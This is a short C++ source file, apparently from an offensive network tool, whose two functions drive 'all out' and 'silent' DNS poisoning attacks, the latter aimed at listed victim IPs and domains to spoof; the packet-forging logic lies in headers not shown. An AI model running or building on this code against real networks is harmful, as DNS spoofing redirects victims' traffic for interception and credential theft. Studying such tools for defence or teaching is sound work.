#include "dns_poisoning/public.h"
#include "IpAddress.h"
#include "PcapLiveDevice.h"
#include "PcapLiveDeviceList.h"
#include "dns_poisoning/all_out.h"
#include "dns_poisoning/dns_poisoning_strategy.h"
#include <dns_poisoning/silent.h>
#include <memory>
#include <stdexcept>
#include <string>
#include <unordered_set>
#include <utility>

// TODO (kala and nick) document this
void ATK::DNS::allOutPoison(const AllOutPoisoningOptions &options) {
    pcpp::PcapLiveDevice *device =
        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
            options.ifaceIpOrName);

    if (device == nullptr || !device->open()) {
        throw std::runtime_error("Couldn't open device");
    }

    std::unique_ptr<ATK::DNS::AllOutDnsPoisoningStrategy> strategy;
    const pcpp::IPv4Address attackerIp(options.attackerIp);
    strategy = AllOutDnsPoisoningStrategy::Builder(device)
                   .attackerIp(attackerIp)
                   .build();

    DnsPoisoningContext dnsPoisoningContext(std::move(strategy));

    dnsPoisoningContext.execute();
}

// TODO (kala and nick) document this
void ATK::DNS::silentPoison(const SilentPoisoningOptions &options) {
    pcpp::PcapLiveDevice *device =
        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
            options.ifaceIpOrName);

    if (device == nullptr || !device->open()) {
        throw std::runtime_error("Couldn't open device");
    }

    std::unique_ptr<ATK::DNS::SilentDnsPoisoningStrategy> strategy;
    const pcpp::IPv4Address attackerIp(options.attackerIp);
    std::unordered_set<pcpp::IPv4Address> victimIps;

    for (const auto &ipStr : options.victimIps) {
        victimIps.insert(pcpp::IPv4Address(ipStr));
    }

    if (victimIps.empty()) {
        throw std::runtime_error("No victims provided");
    }
    const std::unordered_set<std::string> domainsToSpoof(
        options.domainsToSpoof.begin(), options.domainsToSpoof.end());
    strategy = SilentDnsPoisoningStrategy::Builder(device)
                   .attackerIp(attackerIp)
                   .victimIps(victimIps)
                   .domainsToSpoof(domainsToSpoof)
                   .build();

    DnsPoisoningContext dnsPoisoningContext(std::move(strategy));

    dnsPoisoningContext.execute();
}